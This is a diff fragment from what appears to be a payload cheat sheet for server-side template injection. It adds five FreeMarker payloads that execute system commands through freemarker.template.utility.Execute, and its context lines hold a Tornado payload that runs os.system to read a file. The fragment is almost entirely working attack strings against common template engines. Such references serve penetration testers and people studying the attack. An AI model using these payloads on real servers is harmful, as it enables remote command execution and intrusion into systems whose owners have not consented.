@@ -96,6 +96,16 @@ the "OS" module can be used to run/execute python on a TORNADO template. check t
 you can mix commands to get the desired results, importing the OS module bring the chance to use or call OS commands in general.
 
 {% import os %}{{os.system('cat /home/user/mo.txt')	
+
+<b> >> FREEMARKER</b>
+
+<b>code execution:</b> 
+
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
+[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
+${"freemarker.template.utility.Execute"?new()("id")}
+#{"freemarker.template.utility.Execute"?new()("id")}
+[="freemarker.template.utility.Execute"?new()("id")]
 	
 </details>
 	
